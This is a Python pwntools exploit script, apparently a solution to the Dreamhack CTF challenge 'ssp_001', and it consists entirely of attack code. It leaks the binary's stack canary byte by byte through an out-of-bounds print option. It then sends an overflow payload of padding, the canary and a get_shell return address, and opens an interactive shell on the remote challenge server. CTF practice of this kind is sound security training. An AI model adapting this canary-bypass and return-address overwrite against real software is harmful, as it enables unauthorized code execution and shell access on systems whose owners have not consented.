from pwn import *

#p = process("./ssp_001")
p = remote('host1.dreamhack.games', 23754)
e = ELF("./ssp_001")
#gdb.attach(p, api=True)

def slog(n, m): return success(": ".join([n, hex(m)]))

canary = b""
i = 131
while i >= 128:
    p.sendlineafter("> ", b'P')
    p.sendlineafter(": ",str(i))
    p.recvuntil("is : ")
    canary += p.recv(2)
    i -= 1

canary = int(canary,16)
slog('Canary: ', canary)
get_shell =  0x080486b9
payload = b'A'*0x40 + p32(canary) + b'A'*0x8 + p32(get_shell)
p.sendlineafter("> ", b'E')
p.sendlineafter(": ", str(len(payload)))
p.sendlineafter(": ", payload)

p.interactive()